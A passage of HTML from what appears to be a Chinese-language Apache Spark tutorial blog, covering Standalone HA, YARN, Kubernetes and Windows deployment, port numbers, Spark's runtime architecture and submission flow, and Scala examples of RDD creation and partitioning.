class="string">-Dspark.deploy.recoveryMode=ZOOKEEPER</span></span><br><span class="line"><span class="string">-Dspark.deploy.zookeeper.url=hadoop102,hadoop103,hadoop104</span></span><br><span class="line"><span class="string">-Dspark.deploy.zookeeper.dir=/spark"</span></span><br><span class="line"><span class="comment"># 分发配置文件</span></span><br><span class="line">xsync conf/</span><br><span class="line">sbin/start-all.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 hadoop103的单独 Master 节点，此时 hadoop103节点 Master 状态处于备用状态</span></span><br><span class="line">sbin/start-master.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交应用</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077,hadoop103:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-5-Yarn-模式">2.5 Yarn 模式</h3><p>独立部署（Standalone）模式由 Spark 自身提供计算资源，无需其他框架提供资源。这种方式降低了和其他第三方资源框架的耦合性，独立性非常强。但是你也要记住，Spark 主要是计算框架，而不是资源调度框架，所以本身提供的资源调度并不是它的强项，所以还是和其他专业的资源调度框架集成会更靠谱一些。所以接下来我们来学习在强大的Yarn 环境下 Spark 是如何工作的（其实是因为在国内工作中，Yarn 使用的非常多）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 hadoop 配置文件/opt/ha/hadoop-3.1.3/etc/hadoop/yarn-site.xml,  并分发</span></span><br><span class="line">vim /opt/ha/hadoop-3.1.3/etc/hadoop/yarn-site.xml</span><br><span class="line">&lt;!--是否启动一个线程检查每个任务正使用的物理内存量，如果任务超出分配值，则直接将其杀掉，默认是 <span class="literal">true</span> --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;yarn.nodemanager.pmem-check-enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;<span class="literal">false</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是 <span class="literal">true</span> --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;yarn.nodemanager.vmem-check-enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;<span class="literal">false</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 conf/spark-env.sh，添加 JAVA_HOME 和YARN_CONF_DIR 配置</span></span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line"><span class="comment"># 添加以下内容，hadoop天自己的，我这里是ha高可用地址，其他例如YARN_CONF_DIR=/opt/module/hadoop/etc/hadoop</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_121</span><br><span class="line">YARN_CONF_DIR=/opt/ha/hadoop-3.1.3/etc/hadoop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之前要启动 HDFS 以及 YARN 集群</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master yarn \</span><br><span class="line">--deploy-mode cluster \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><p>配置历史服务器，之前一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 spark-defaults.conf.template 文件名为 spark-defaults.conf</span></span><br><span class="line"><span class="comment"># 其他一样，主要修改 spark-defaults.conf</span></span><br><span class="line">spark.yarn.historyServer.address=hadoop102:18080</span><br><span class="line">spark.history.ui.port=18080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启history，主要在yarn调度界面就可以直接从历史记录跳转到spark的历史记录了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面会把结果显示在控制台</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master yarn \</span><br><span class="line">--deploy-mode client \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-6-K8S-Mesos-模式">2.6 K8S &amp; Mesos 模式</h3><p>Mesos 是Apache 下的开源分布式资源管理框架，它被称为是分布式系统的内核,在Twitter 得到广泛使用,管理着 Twitter 超过 30,0000 台服务器上的应用部署，但是在国内，依然使用着传统的Hadoop 大数据框架，所以国内使用 Mesos 框架的并不多</p><p>容器化部署是目前业界很流行的一项技术，基于Docker 镜像运行能够让用户更加方便地对应用进行管理和运维。容器管理工具中最为流行的就是Kubernetes（k8s），而 Spark 也在最近的版本中支持了k8s 部署模式。可以参考：<a href="https://spark.apache.org/docs/latest/running-on-kubernetes.html" target="_blank" rel="noopener" title="https://spark.apache.org/docs/latest/running-on-kubernetes.html">https://spark.apache.org/docs/latest/running-on-kubernetes.html</a></p><h3 id="2-7-Windows-模式">2.7 Windows 模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://archive.apache.org/dist/spark/spark-3.0.0/</span></span><br><span class="line"><span class="comment"># 将文件 spark-3.0.0-bin-hadoop3.2.tgz 解压缩到无中文无空格的路径中</span></span><br><span class="line"><span class="comment"># 执行解压缩文件路径下 bin 目录中的 spark-shell.cmd 文件，启动 Spark 本地环境</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 bin 目录中创建 input 目录，并添加word.txt 文件, 在命令行中输入脚本代码</span></span><br><span class="line"><span class="comment"># 命令行提交应用</span></span><br><span class="line">spark-submit --class org.apache.spark.examples.SparkPi --master <span class="built_in">local</span>[2] ../examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-8-部署模式对比">2.8 部署模式对比</h3><table><thead><tr><th><strong>模式</strong></th><th><strong>Spark 安装机器数</strong></th><th><strong>需启动的进程</strong></th><th><strong>所属者</strong></th><th><strong>应用场景</strong></th></tr></thead><tbody><tr><td>Local</td><td>1</td><td>无</td><td>Spark</td><td>测试</td></tr><tr><td>Standalone</td><td>3</td><td>Master 及 Worker</td><td>Spark</td><td>单独部署</td></tr><tr><td>Yarn</td><td>1</td><td>Yarn 及 HDFS</td><td>Hadoop</td><td>混合部署</td></tr></tbody></table><h3 id="2-9-端口号">2.9 端口号</h3><ul><li>Spark 查看当前 Spark-shell 运行任务情况端口号：4040（计算）</li><li>Spark Master 内部通信服务端口号：7077</li><li>Standalone 模式下，Spark Master Web 端口号：8080（资源）</li><li>Spark 历史服务器端口号：18080</li><li>Hadoop YARN 任务运行情况查看端口号：8088</li></ul><h2 id="3、Spark-运行架构">3、Spark 运行架构</h2><h3 id="3-1-运行架构">3.1 运行架构</h3><p>Spark 框架的核心是一个计算引擎，整体来说，它采用了标准 master-slave 的结构。如下图所示，它展示了一个 Spark 执行时的基本结构。图形中的Driver 表示 master，负责管理整个集群中的作业任务调度。图形中的Executor 则是 slave，负责实际执行任务</p><p><img src="http://qnypic.shawncoding.top/blog/202402291816075.png" alt></p><h3 id="3-2-核心组件">3.2 核心组件</h3><p><strong>Driver</strong></p><p>Spark 驱动器节点，用于执行 Spark 任务中的 main 方法，负责实际代码的执行工作。Driver 在Spark 作业执行时主要负责：</p><ul><li>将用户程序转化为作业（job）</li><li>在 Executor 之间调度任务(task)</li><li>跟踪Executor 的执行情况</li><li>通过UI 展示查询运行情况</li></ul><p>实际上，我们无法准确地描述Driver 的定义，因为在整个的编程过程中没有看到任何有关Driver 的字眼。所以简单理解，所谓的 Driver 就是驱使整个应用运行起来的程序，也称之为Driver 类。</p><p><strong>Executor</strong></p><p>Spark Executor 是集群中工作节点（Worker）中的一个 JVM 进程，负责在 Spark 作业中运行具体任务（Task），任务彼此之间相互独立。Spark 应用启动时，Executor 节点被同时启动，并且始终伴随着整个 Spark 应用的生命周期而存在。如果有Executor 节点发生了故障或崩溃，Spark 应用也可以继续执行，会将出错节点上的任务调度到其他 Executor 节点上继续运行。Executor 有两个核心功能：</p><ul><li>负责运行组成 Spark 应用的任务，并将结果返回给驱动器进程</li><li>它们通过自身的块管理器（Block Manager）为用户程序中要求缓存的 RDD 提供内存式存储。RDD 是直接缓存在 Executor 进程内的，因此任务可以在运行时充分利用缓存数据加速运算</li></ul><p><strong>Master</strong> <strong>&amp;</strong> <strong>Worker</strong></p><p>Spark 集群的独立部署环境中，不需要依赖其他的资源调度框架，自身就实现了资源调度的功能，所以环境中还有其他两个核心组件：Master 和 Worker，这里的 Master 是一个进程，主要负责资源的调度和分配，并进行集群的监控等职责，类似于 Yarn 环境中的 RM, 而Worker 呢，也是进程，一个 Worker 运行在集群中的一台服务器上，由 Master 分配资源对数据进行并行的处理和计算，类似于 Yarn 环境中 NM。</p><p><strong>ApplicationMaster</strong></p><p>Hadoop 用户向 YARN 集群提交应用程序时,提交程序中应该包ApplicationMaster，用于向资源调度器申请执行任务的资源容器 Container，运行用户自己的程序任务 job，监控整个任务的执行，跟踪整个任务的状态，处理任务失败等异常情况。说的简单点就是，ResourceManager（资源）和Driver（计算）之间的解耦合靠的就是ApplicationMaster</p><h3 id="3-3-核心概念">3.3 核心概念</h3><p>Spark Executor 是集群中运行在工作节点（Worker）中的一个 JVM 进程，是整个集群中的专门用于计算的节点。在提交应用中，可以提供参数指定计算节点的个数，以及对应的资源。这里的资源一般指的是工作节点 Executor 的内存大小和使用的虚拟 CPU 核（Core）数量</p><table><thead><tr><th><strong>名称</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>–num-executors</td><td>配置 Executor 的数量</td></tr><tr><td>–executor-memory</td><td>配置每个 Executor 的内存大小</td></tr><tr><td>–executor-cores</td><td>配置每个 Executor 的虚拟 CPU core 数量</td></tr></tbody></table><p>在分布式计算框架中一般都是多个任务同时执行，由于任务分布在不同的计算节点进行计算，所以能够真正地实现多任务并行执行，记住，这里是并行，而不是并发。这里我们<strong>将整个集群并行执行任务的数量称之为并行度</strong>。</p><p>针对<strong>有向无环图（ DAG）</strong>，是由 Spark 程序直接映射成的数据流的高级抽象模型</p><h3 id="3-4-提交流程">3.4 提交流程</h3><p>开发人员根据需求写的应用程序通过 Spark 客户端提交给 Spark 运行环境执行计算的流程。在不同的部署环境中，这个提交过程基本相同，但是又有细微的区别，Spark 应用程序提交到 Yarn 环境中执行的时候，一般会有两种部署执行的方式：Client 和 Cluster。<strong>两种模式主要区别在于：Driver 程序的运行节点位置</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202402291816201.png" alt></p><p><strong>Yarn Client 模式</strong></p><p>Client 模式将用于监控和调度的Driver 模块在客户端执行，而不是在 Yarn 中，所以一般用于测试</p><ul><li>Driver 在任务提交的本地机器上运行</li><li>Driver 启动后会和ResourceManager 通讯申请启动ApplicationMaster</li><li>ResourceManager 分配 container，在合适的NodeManager 上启动ApplicationMaster，负责向ResourceManager 申请 Executor 内存</li><li>ResourceManager 接到 ApplicationMaster 的资源申请后会分配 container，然后ApplicationMaster 在资源分配指定的NodeManager 上启动 Executor 进程</li><li>Executor 进程启动后会向Driver 反向注册，Executor 全部注册完成后Driver 开始执行main 函数</li><li>之后执行到 Action 算子时，触发一个 Job，并根据宽依赖开始划分 stage，每个stage 生成对应的TaskSet，之后将 task 分发到各个Executor 上执行</li></ul><p><strong>Yarn Cluster 模式(重要)</strong></p><p>Cluster 模式将用于监控和调度的 Driver 模块启动在Yarn 集群资源中执行。一般应用于实际生产环境</p><ul><li>在 YARN Cluster 模式下，任务提交后会和ResourceManager 通讯申请启动ApplicationMaster</li><li>随后ResourceManager 分配 container，在合适的 NodeManager 上启动 ApplicationMaster，此时的 ApplicationMaster 就是Driver</li><li>Driver 启动后向 ResourceManager 申请Executor 内存，ResourceManager 接到ApplicationMaster 的资源申请后会分配container，然后在合适的NodeManager 上启动Executor 进程</li><li>Executor 进程启动后会向Driver 反向注册，Executor 全部注册完成后Driver 开始执行main 函数，</li><li>之后执行到 Action 算子时，触发一个 Job，并根据宽依赖开始划分 stage，每个stage 生成对应的TaskSet，之后将 task 分发到各个Executor 上执行</li></ul><h1>二、Spark核心编程(Core)</h1><h2 id="1、概述">1、概述</h2><p>Spark 计算框架为了能够进行高并发和高吞吐的数据处理，封装了三大数据结构，用于处理不同的应用场景。三大数据结构分别是：</p><ul><li>RDD : 弹性分布式数据集</li><li>累加器：分布式共享只写变量</li><li>广播变量：分布式共享只读变量</li></ul><h2 id="2、RDD详解">2、RDD详解</h2><h3 id="2-1-RDD概述">2.1 RDD概述</h3><p>RDD（Resilient Distributed Dataset） 提供了一个抽象的数据模型，让我们不必担心底层数据的分布式特性，只需将具体的应用逻辑表达为一系列转换操作(函数)，不同 RDD 之间的转换操作之间还可以形成依赖关系，进而实现管道化，从而避免了中间结果的存储，大大降低了数据复制、磁盘 IO 和序列化开销，并且还提供了更多的 API(map/reduec/filter/groupBy)</p><p>RDD叫做弹性分布式数据集，是 Spark 中最基本的数据处理模型。代码中是一个抽象类，它代表一个弹性的、不可变、可分区、里面的元素可并行计算的集合。</p><ul><li>弹性<ul><li>存储的弹性：内存与磁盘的自动切换；</li><li>容错的弹性：数据丢失可以自动恢复；</li><li>计算的弹性：计算出错重试机制；</li><li>分片的弹性：可根据需要重新分片。</li></ul></li><li>分布式：数据存储在大数据集群不同节点上</li><li>数据集：RDD 封装了计算逻辑，并不保存数据</li><li>数据抽象：RDD 是一个抽象类，需要子类具体实现</li><li>不可变：RDD 封装了计算逻辑，是不可以改变的，想要改变，只能产生新的RDD，在新的RDD 里面封装计算逻辑</li><li>可分区、并行计算</li></ul><h3 id="2-2-RDD主要属性">2.2 RDD主要属性</h3><p>在源码中可以看到有对 RDD 介绍的注释</p><ul><li><em>A list of partitions</em> ： 一组分片(Partition)/一个分区(Partition)列表，即数据集的基本组成单位。 对于 RDD 来说，每个分片都会被一个计算任务处理，分片数决定并行度。 用户可以在创建 RDD 时指定 RDD 的分片个数，如果没有指定，那么就会采用默认值</li><li><em>A function for computing each split</em> ： 一个函数会被作用在每一个分区。 Spark 中 RDD 的计算是以分片为单位的，compute 函数会被作用到每个分区上</li><li><em>A list of dependencies on other RDDs</em> ： 一个 RDD 会依赖于其他多个 RDD。 RDD 的每次转换都会生成一个新的 RDD，所以 RDD 之间就会形成类似于流水线一样的前后依赖关系。在部分分区数据丢失时，Spark 可以通过这个依赖关系重新计算丢失的分区数据，而不是对 RDD 的所有分区进行重新计算。(Spark 的容错机制)</li><li><em>Optionally, a Partitioner for key-value RDDs (e.g. to say that the RDD is hash-partitioned)</em>： 可选项，对于 KV 类型的 RDD 会有一个 Partitioner，即 RDD 的分区函数，默认为 HashPartitioner。</li><li><em>Optionally, a list of preferred locations to compute each split on (e.g. block locations for an HDFS file)</em>： 可选项,一个列表，存储存取每个 Partition 的优先位置(preferred location)。 对于一个 HDFS 文件来说，这个列表保存的就是每个 Partition 所在的块的位置。按照&quot;移动数据不如移动计算&quot;的理念，Spark 在进行任务调度的时候，会尽可能选择那些存有数据的 worker 节点来进行任务计算。</li></ul><h3 id="2-3-执行原理">2.3 执行原理</h3><p>Spark 框架在执行时，先申请资源，然后将应用程序的数据处理逻辑分解成一个一个的计算任务。然后将任务发到已经分配资源的计算节点上, 按照指定的计算模型进行数据计算。最后得到计算结果。RDD 是 Spark 框架中用于数据处理的核心模型，接下来看看在 Yarn 环境中RDD 的工作原理:</p><ul><li>启动 Yarn 集群环境</li><li>Spark 通过申请资源创建调度节点和计算节点</li><li>Spark 框架根据需求将计算逻辑根据分区划分成不同的任务</li><li>调度节点将任务根据计算节点状态发送到对应的计算节点进行计算</li></ul><p>RDD 在整个流程中主要用于将逻辑进行封装，并生成 Task 发送给Executor 节点执行计算</p><h2 id="3、RDD-API">3、RDD-API</h2><h3 id="3-1-RDD-的创建方式">3.1 RDD 的创建方式</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// =================1)从集合（内存）中创建 RDD========</span></span><br><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从内存中创建RDD，将内存中集合的数据作为处理的数据源</span></span><br><span class="line"><span class="keyword">val</span> seq = <span class="type">Seq</span>[<span class="type">Int</span>](<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">// parallelize : 并行</span></span><br><span class="line"><span class="comment">//val rdd: RDD[Int] = sc.parallelize(seq)</span></span><br><span class="line"><span class="comment">// makeRDD方法在底层实现时其实就是调用了rdd对象的parallelize方法。</span></span><br><span class="line"><span class="keyword">val</span> rdd: <span class="type">RDD</span>[<span class="type">Int</span>] = sc.makeRDD(seq)</span><br><span class="line">rdd.collect().foreach(println)</span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================2)从外部存储（文件）创建RDD=========</span></span><br><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 创建RDD</span></span><br><span class="line"><span class="comment">// 从文件中创建RDD，将文件中的数据作为处理的数据源</span></span><br><span class="line"><span class="comment">// path路径默认以当前环境的根路径为基准。可以写绝对路径，也可以写相对路径</span></span><br><span class="line"><span class="comment">//sc.textFile("D:\\mineworkspace\\idea\\classes\\atguigu-classes\\datas\\1.txt")</span></span><br><span class="line"><span class="comment">//val rdd: RDD[String] = sc.textFile("datas/1.txt")</span></span><br><span class="line"><span class="comment">// path路径可以是文件的具体路径，也可以目录名称</span></span><br><span class="line"><span class="comment">//val rdd = sc.textFile("datas")</span></span><br><span class="line"><span class="comment">// path路径还可以使用通配符 *</span></span><br><span class="line"><span class="comment">//val rdd = sc.textFile("datas/1*.txt")</span></span><br><span class="line"><span class="comment">// 读取的结果表示为元组，第一个元素表示文件路径，第二个元素表示文件内容</span></span><br><span class="line"><span class="comment">// val rdd = sc.wholeTextFiles("datas")</span></span><br><span class="line"><span class="comment">// path还可以是分布式存储系统路径：HDFS</span></span><br><span class="line"><span class="keyword">val</span> rdd = sc.textFile(<span class="string">"hdfs://hadoop102:8020/test.txt"</span>)</span><br><span class="line">rdd.collect().foreach(println)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==============3)从其他 RDD 创建=========</span></span><br><span class="line"><span class="comment">//主要是通过一个RDD 运算完后，再产生新的RDD</span></span><br><span class="line"><span class="comment">// ===============直接创建 RDD（new）=========</span></span><br><span class="line"><span class="comment">// 使用 new 的方式直接构造RDD，一般由Spark 框架自身使用</span></span><br></pre></td></tr></table></figure><h3 id="3-2-RDD-并行度与分区">3.2 RDD 并行度与分区</h3><p>默认情况下，Spark 可以将一个作业切分多个任务后，发送给 Executor 节点并行计算，而能够并行计算的任务数量我们称之为并行度。这个数量可以在构建RDD 时指定</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line">sparkConf.set(<span class="string">"spark.default.parallelism"</span>, <span class="string">"5"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 创建RDD</span></span><br><span class="line"><span class="comment">// RDD的并行度 &amp; 分区</span></span><br><span class="line"><span class="comment">// makeRDD方法可以传递第二个参数，这个参数表示分区的数量</span></span><br><span class="line"><span class="comment">// 第二个参数可以不传递的，那么makeRDD方法会使用默认值 ： defaultParallelism（默认并行度）</span></span><br><span class="line"><span class="comment">//     scheduler.conf.getInt("spark.default.parallelism", totalCores)</span></span><br><span class="line"><span class="comment">//    spark在默认情况下，从配置对象中获取配置参数：spark.default.parallelism</span></span><br><span class="line"><span class="comment">//    如果获取不到，那么使用totalCores属性，这个属性取值为当前运行环境的最大可用核数</span></span><br><span class="line"><span class="comment">//val rdd = sc.makeRDD(List(1,2,3,4),2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Spark读取文件，底层其实使用的就是Hadoop的读取方式</span></span><br><span class="line"><span class="comment">// 分区数量的计算方式：</span></span><br><span class="line"><span class="comment">//    totalSize = 7</span></span><br><span class="line"><span class="comment">//    goalSize =  7 / 2 = 3（byte）</span></span><br><span class="line"><span class="comment">//    7 / 3 = 2...1 (1.1) + 1 = 3(分区)</span></span><br><span class="line"><span class="comment">// 1. 数据以行为单位进行读取</span></span><br><span class="line"><span class="comment">//    spark读取文件，采用的是hadoop的方式读取，所以一行一行读取，和字节数没有关系</span></span><br><span class="line"><span class="comment">// 2. 数据读取时以偏移量为单位,偏移量不会被重复读取</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   1@@   =&gt; 012</span></span><br><span class="line"><span class="comment">   2@@   =&gt; 345</span></span><br><span class="line"><span class="comment">   3     =&gt; 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 3. 数据分区的偏移量范围的计算</span></span><br><span class="line"><span class="comment">// 0 =&gt; [0, 3]  =&gt; 12</span></span><br><span class="line"><span class="comment">// 1 =&gt; [3, 6]  =&gt; 3</span></span><br><span class="line"><span class="comment">// 2 =&gt; [6, 7]  =&gt;</span></span><br><span class="line"><span class="comment">// val rdd = sc.textFile("datas/1.txt", 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将处理的数据保存成分区文件</span></span><br><span class="line">rdd.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// =======================================</span></span><br><span class="line"><span class="comment">// 读取内存数据时，数据可以按照并行度的设定进行数据的分区操作，数据分区规则的Spark 核心源码如下</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">positions</span></span>(length: <span class="type">Long</span>, numSlices: <span class="type">Int</span>): <span class="type">Iterator</span>[(<span class="type">Int</span>, <span class="type">Int</span>)] = &#123;</span><br><span class="line"> (<span class="number">0</span> until numSlices).iterator.map &#123; i =&gt;</span><br><span class="line"> <span class="keyword">val</span> start = ((i * length) / numSlices).toInt</span><br><span class="line"> <span class="keyword">val</span> end = (((i + <span class="number">1</span>) * length) / numSlices).toInt</span><br><span class="line"> (start, end)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================================</span></span><br><span class="line"><span class="comment">// 读取文本时的分类规则，和内存有所不同</span></span><br><span class="line">public <span class="type">InputSplit</span>[] getSplits(<span class="type">JobConf</span> job, int numSplits)</span><br><span class="line">    <span class="keyword">throws</span> <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    long totalSize = <span class="number">0</span>;                           <span class="comment">// compute total size</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">FileStatus</span> file: files) &#123;                <span class="comment">// check we have valid files</span></span><br><span class="line">      <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IOException</span>(<span class="string">"Not a file: "</span>+ file.getPath());</span><br><span class="line">      &#125;</span><br><span class="line">      totalSize += file.getLen();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    long goalSize = totalSize / (numSplits == <span class="number">0</span> ? <span class="number">1</span> : numSplits);</span><br><span class="line">    long minSize = <span class="type">Math</span>.max(job.getLong(org.apache.hadoop.mapreduce.lib.input.</span><br><span class="line">      <span class="type">FileInputFormat</span>.<span class="type">SPLIT_MINSIZE</span>, <span class="number">1</span>), minSplitSize);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">FileStatus</span> file: files) &#123;</span><br><span class="line">      ...</span><br><span class="line">        <span class="keyword">if</span> (isSplitable(fs, path)) &#123;</span><br><span class="line">          long blockSize = file.getBlockSize();</span><br><span class="line">          long splitSize = computeSplitSize(goalSize, minSize, blockSize);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> long computeSplitSize(long goalSize, long minSize,long blockSize) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">Math</span>.max(minSize, <span class="type">Math</span>.min(goalSize, blockSize));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-RDD-转换算子">3.3 RDD 转换算子</h3><p>RDD 的算子分为两类:</p><ul><li>Transformation_转换操作:<strong>返回一个新的 RDD</strong></li><li>Action动作操作:<strong>返回值不是 